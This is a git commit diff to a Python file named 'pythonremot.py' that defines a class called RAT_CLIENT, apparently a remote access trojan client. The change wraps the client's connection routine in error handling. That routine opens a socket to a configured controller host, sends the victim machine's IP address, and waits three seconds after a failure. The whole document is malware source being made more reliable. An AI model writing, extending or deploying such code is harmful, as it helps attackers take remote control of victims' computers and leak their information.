fc6d0abf47ed4b4c038bb832d60c1f24f62c8cb7
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-11-20 10:52:00 -0500

    Update pythonremot.py

--- pythonremot.py
+++ pythonremot.py
@@ -42,10 +42,14 @@ class RAT_CLIENT:
 
     def build_connection(self):
         global s
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((self.host, self.port))
-        sending = socket.gethostbyname(socket.gethostname())
-        s.send(sending.encode())
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((self.host, self.port))
+            sending = socket.gethostbyname(socket.gethostname())
+            s.send(sending.encode())
+        except socket.error as e:
+            print (e)
+            time.sleep(3)
             
     def errorsend(self):
         output = bytearray("no output", encoding='utf8')
